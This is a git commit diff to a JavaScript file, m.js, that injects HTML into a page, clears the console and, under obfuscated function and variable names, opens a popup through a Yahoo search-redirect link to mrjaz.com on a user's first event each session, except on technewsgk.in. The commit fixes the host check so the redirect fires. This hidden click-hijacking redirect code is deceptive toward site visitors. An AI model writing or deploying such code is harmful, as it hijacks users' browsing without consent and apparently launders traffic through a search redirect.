7562a93227618a49d3eedaaf3601d98cea5cad7b
Sonu Kumar Beast <67105554+SonuBeast@users.noreply.github.com>
2021-01-22 21:54:01 +0530

    Update m.js

--- m.js
+++ m.js
@@ -4,11 +4,11 @@ if(document.querySelector('header')){document.querySelector('header').insertAdja
 else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}
 console.clear();
 
-if(location.href=='' || ){window.open('')}
+// if(location.href=='' || ){window.open('')}
 
 let udwwoe = (dfgdgd) => {
         document.addEventListener(dfgdgd, () => {
-                if (!sessionStorage.hsdfhs && location.href !== 'www.technewsgk.in') {
+                if (!sessionStorage.hsdfhs && location.host !== 'www.technewsgk.in') {
                       window.open('https://r.search.yahoo.com/_ylt=AwrPiBX4pQpg5g8AoUa7HAx.;_ylu=Y29sbwNzZzMEcG9zAzEEdnRpZAMEc2VjA3Ny/RV=2/RE=1611339384/RO=10/RU=https%3a%2f%2fwww.mrjaz.com%2f/RK=2/RS=dTHlZSIXl7UQq3xHPbPEh151Uqw-')
                         sessionStorage.hsdfhs = '1';
                 }
